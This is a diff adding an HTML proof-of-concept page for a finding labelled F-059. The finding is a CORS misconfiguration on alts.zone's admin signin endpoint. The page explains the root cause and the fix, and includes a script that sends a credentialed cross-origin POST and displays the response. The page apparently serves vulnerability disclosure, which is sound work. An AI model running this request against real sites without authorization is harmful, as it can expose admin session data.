@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>PoC: CORS Misconfiguration — alts.zone (F-059)</title>
+<style>
+  body { font-family: monospace; background:#0d1117; color:#c9d1d9; max-width:860px; margin:40px auto; padding:20px; }
+  h1 { color:#fb8f44; font-size:1.2rem; }
+  .meta { background:#161b22; border:1px solid #30363d; border-radius:6px; padding:16px; margin:16px 0; font-size:.85rem; line-height:1.6; }
+  #result { background:#0d1a2e; border:1px solid #58a6ff; border-radius:6px; padding:14px; margin-top:16px; white-space:pre-wrap; min-height:80px; }
+  button { background:#fb8f44; color:#fff; border:none; padding:10px 22px; border-radius:6px; cursor:pointer; font-size:.9rem; }
+  pre { background:#161b22; border:1px solid #30363d; border-radius:6px; padding:14px; overflow-x:auto; font-size:.8rem; }
+</style>
+</head>
+<body>
+<h1>⚠️ PoC: CORS Misconfiguration — alts.zone Admin (F-059)</h1>
+<div class="meta">
+  <strong>Finding:</strong> F-059 · Severity: HIGH<br>
+  <strong>Root cause:</strong> <code>Access-Control-Allow-Origin: *</code> combined with
+  <code>Access-Control-Allow-Credentials: true</code> on <code>/admin/session/signin</code><br>
+  <strong>Impact:</strong> Any origin can read the response from the admin login endpoint,
+  including session tokens or error data. Combined with CSRF (F-091), a malicious page can
+  both submit credentials AND read the response cross-origin.
+</div>
+
+<button onclick="runTest()">▶ Test Cross-Origin Read</button>
+<div id="result">Click to run...</div>
+
+<h3 style="margin-top:20px;color:#8b949e;">The broken header combination</h3>
+<pre>Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+
+// Per CORS spec: credentials + wildcard origin is INVALID.
+// Browsers may still allow it — a specific origin like
+// Access-Control-Allow-Origin: https://alts.zone should be set.</pre>
+
+<h3 style="color:#8b949e;">Fix</h3>
+<pre>// nginx.conf — restrict to own origin only:
+add_header Access-Control-Allow-Origin "https://alts.zone" always;
+add_header Access-Control-Allow-Credentials "true" always;
+// Never use * with credentials:true</pre>
+
+<script>
+async function runTest() {
+  document.getElementById("result").textContent = "Sending cross-origin request to alts.zone/admin/session/signin...";
+  try {
+    const r = await fetch("https://alts.zone/admin/session/signin", {
+      method: "POST",
+      headers: {"Content-Type": "application/x-www-form-urlencoded"},
+      body: new URLSearchParams({username:"cors_poc_test", password:"cors_poc_test"}).toString(),
+      credentials: "include"
+    });
+    const txt = await r.text();
+    const acao = r.headers.get("access-control-allow-origin") || "(not readable from JS)";
+    document.getElementById("result").textContent =
+      "Status: " + r.status + "\n" +
+      "Access-Control-Allow-Origin: " + acao + "\n\n" +
+      "Response body (cross-origin readable):\n" + txt.slice(0, 400) + "\n\n" +
+      (r.status === 200 ? "✅ CORS confirmed — cross-origin read succeeded" : "Status " + r.status);
+  } catch(e) {
+    document.getElementById("result").textContent = "Error: " + e.message;
+  }
+}
+</script>
+</body>
+</html>
